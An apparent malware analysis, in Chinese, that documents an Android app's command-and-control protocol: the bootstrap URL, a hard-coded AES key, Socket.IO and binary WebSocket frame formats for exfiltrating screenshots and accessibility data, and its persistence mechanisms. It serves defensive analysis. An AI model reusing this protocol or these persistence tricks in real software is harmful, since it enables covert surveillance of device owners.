## 1. 阶段一：HTTP 引导与 token 解密

```java
// p086/RunnableC0808.java  case 0（QuickProbe 线程）
String url = "https://www.cohuducox.com/adv.php?apk=10068&device=" + AbstractC0429.f1493;
Response r = okHttp(connect=5s, read=5s, trustAllTLS).newCall(GET url).execute();

    String domain = cfg.optString("domain", "cohuducox.com");
    int    port   = Integer.parseInt(cfg.optString("port", "3000"));
    if (!host.contains(".")) host = host + "." + domain;          // "x" → "x.cohuducox.com"
    …  // 缓存 host/port/token，进入 Socket.IO
}
```

| 项 | 值 |
|---|---|
| 方法/URL | `GET https://www.cohuducox.com/adv.php?apk=10068&device={android_id}` |
| 请求头 | 无自定义头（OkHttp 默认 UA） |
| 响应 | `{"token": "<Base64 密文>"}`（其他字段忽略） |
| 解密 | AES/ECB/PKCS5Padding，Key = `0623U25KTT3YO8P9`，`Base64.decode(token, DEFAULT)` |
| 明文结构 | `{"host":"<子域或全域名>","domain":"<主域>","port":"<端口数字字符串>"}` |
| 默认值 | host=`www`、domain=`cohuducox.com`、port=`3000` |
| 用途 | 域名/端口可随时切换（抗封禁），`token` 原样带入 Socket.IO 查询串 |

明文字段语义：`host` 不含 `.` 时与 `domain` 拼接（如 `{"host":"gw","domain":"cohuducox.com"}` → `gw.cohuducox.com`）；`port` 同时决定 Socket.IO 的 **path 后缀**（见 §2）。

### 2.1 实际请求

| 项 | 值 |
|---|---|
| 逻辑 URI | `https://{host}/io{port}/?apkid=10068&line={token}&cmode=test&device={android_id}&ver=v4.0` |
| 示例 | `wss://www.cohuducox.com/io3000/?apkid=10068&cmode=test&device=a1b2…&line=<token>&ver=v4.0&EIO=3&transport=websocket` |
| 传输 | **Engine.IO 协议版本 3**（`io.socket.engineio.client.Socket.PROTOCOL = 3`，查询参数 `EIO=3`）；Socket.IO 协议版本 4（`io.socket.parser.Parser.protocol = 4`）；**仅 WebSocket**，`upgrade=false`、`multiplex=false`、自动重连关闭 |

### 2.3 上行信封（`enc msg`）

```java
// p008/C0272.java: m872(action, data)
JSONObject env = new JSONObject();
env.put("action", action);
env.put("type", "enc");           // 固定 "enc"
if (data != null) env.put("data", data);
String enc = Base64.encodeToString( AES_ECB_PKCS5(env.toString()), 2 /*NO_WRAP*/ );

```

- 算法：`AES/ECB/PKCS5Padding`；Key = `"0623U25KTT3YO8P9".getBytes("UTF-8")`（`p081/C0762` 构造器 `C0762(AbstractC0004)`）。

- 结构：`{"action":"<动作名>","type":"enc","data":{…}}`。

## 3. 阶段三：二进制 WebSocket 数据通道

### 3.1 连接


| 项 | 值 |
|---|---|
| URL | `wss://{host}:443/ws/binary-device?deviceId={android_id}` |
| 端口 | 固定 **443**（与 Socket.IO 的 `port` 无关） |
| 读超时 | 0（无限），靠 30s ping 维持 |

### 3.2 帧格式与操作码

```java
// p086/C0793.java（组帧） / p086/C0813.java（解帧）
byte[] buf = ByteBuffer.allocate(payload.length + 5).order(BIG_ENDIAN)
        .put(type).putInt(payload.length).put(payload).array();
```

```
+--------+---------------------------+---------------------------+
| type   | length (int32, big-endian)| payload (length 字节)      |
| 1 byte | 4 bytes                   | UTF-8 JSON / 二进制图片    |
+--------+---------------------------+---------------------------+
```

| type | 名称 | 方向 | payload |
|---:|---|---|---|
| **48** (0x30) | HELLO 握手 | C→S | `{"deviceId":"<id>","apkId":10068}`（`onOpen` 立即发送） |
| **16** (0x10) | COMMAND 指令 | S→C | `{"action":"…","data":{…}}` UTF-8 JSON |
| **33** (0x21) | PONG | S→C | 心跳应答（日志 `Pong received`，其余类型仅记录 `Unknown frame type`） |
| **1** | SCREEN_FRAME | C→S | 屏幕截图原始字节（JPEG/PNG），由 `ConnOrchestrator.m1717` 发送 |
| **2** | A11Y_TREE | C→S | 无障碍层级 JSON：`{deviceId,pkg:"capture",ac,<w,h,iw,ih,orient>,deviceInfo{…},action:null,zip:"<Base64(gzip(XML))>"}` |
| **4** | THUMB | C→S | 缩略截图 JPEG（`ThumbUp`） |
| **6** | HD_FRAME | C→S | MediaProjection HD 串流帧 |
| **7** | ADB_TREE | C→S | adb `uiautomator dump` 生成的 XML（结构同上，`ac:"adb"`，`zip` 为 gzip+Base64） |

握手/指令示例（hex）：

```
30 0000002d 7b226465766963654964223a2261316232633364346535663630373138222c2261706b4964223a31303036387d
│  └ 45 字节 └ {"deviceId":"a1b2c3d4e5f60718","apkId":10068}
```

入站解析逻辑（`C0813.onMessage`）：长度校验 `0 ≤ len ≤ 剩余长度`，否则丢弃；仅 `type=16` 进入指令分发，其余（33 等）只记日志。

## 4. 连接编排、降级与重连

| 机制 | 参数 | 出处 |
|---|---|---|
| 双通道并行 | 二进制 WS 为“快通道”，Socket.IO 始终保活；二进制连上后 `ConnOrchestrator` 记 `binary transport connected — fast path active` | `C0813.onOpen` |
| 二进制重试 | 最多 5 次，退避 `attempt × 30s`，超限后仅保留 Socket.IO | `C0798.m1715` |
| Socket.IO 重连 | 固定 8s（`reconnectionDelay=8000`，自管定时器），8s 内重复调用被节流；`isConnecting` 卡死 60s 强制复位 | `C0809.m1736/m1739` |
| 网络回调 | `ConnectivityManager.NetworkCallback.onAvailable` → 立即重建双通道；`onLost` 仅记日志 | `p086/C0805` |
| 引导缓存 | host/port/token 命中缓存则直连；`token` 作为 `line=` 参数复用，失败再走 adv.php | `C0809.m1736` |
| 保活 | 前台服务 + WakeLock（`BPackage:SocketWakeLock`，60s）+ WiFiLock + WorkManager 15min + DreamService + JobScheduler + Alarm 30s | `C0809`、`KeepAliveWorker` 等 |
| 崩溃自恢复 | `Thread.setDefaultUncaughtExceptionHandler` 上报 `diag` 后 2s 交由原处理器 | `App.onCreate` |

## 8. 与 native 模板的一致性（交叉验证）

`libnative-guard.so` 的只读数据中存在两份 URL 模板（对应已失效的 JNI `buildUrl`/`buildWsUrl`）：

```
wss://%s:%d/ws/binary-device?deviceId=%s
https://www.%s.com/adv.php?apk=%d&device=%s
```

与 Java 侧实际使用的
`"wss://" + host + ":" + 443 + "/ws/binary-device?deviceId=" + deviceId`
及 `"https://www.cohuducox.com/adv.php?apk=10068&device=" + android_id`
在路径、参数名、参数顺序上完全一致（`%s.com` → `cohuducox.com`，`%d` → `10068`）。四处独立来源（原始 DEX 字符串池、重编译 DEX、jadx 源码、native 字符串）的核对结果见 `crossverify.txt`。
